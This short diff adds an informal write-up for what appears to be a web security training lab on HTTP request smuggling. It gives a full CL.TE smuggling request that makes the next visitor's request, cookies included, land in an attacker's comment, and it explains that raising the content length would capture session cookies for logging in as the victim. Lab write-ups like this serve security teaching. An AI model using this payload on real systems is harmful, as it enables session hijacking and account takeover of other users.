@@ -1,0 +1,27 @@
+I am unable to solve this lab due to my network firewall, however I was able to 
+exploit this lab on myself which wouldve solved the lab.
+
+first sending this request:
+"
+POST / HTTP/1.1
+Host: 0a6f0011037c31aa82e5ab18005500e6.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 275
+Transfer-Encoding: chunked
+
+0
+
+POST /post/comment HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 252
+Cookie: session=ofgfLrvgkj34jzWuOUZHSa7Qd3RQE5ND
+
+csrf=kEUx7OlJpa1F1HmNStpBWXXdJcMjLNfm&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
+
+"
+
+this then allows for the next users request, any request, to end up in my comment, giving the comment of:
+"testGET / HTTP/1.1 Host: 0a6f0011037c31aa82e5ab18005500e6.web-security-academy.net sec-ch-ua: "Google Chrome";v="119", "Chromium";v="11"
+
+i could set the length of the content length higher to extract cookies and then log in as the user, which is how 
+to complete the lab... 
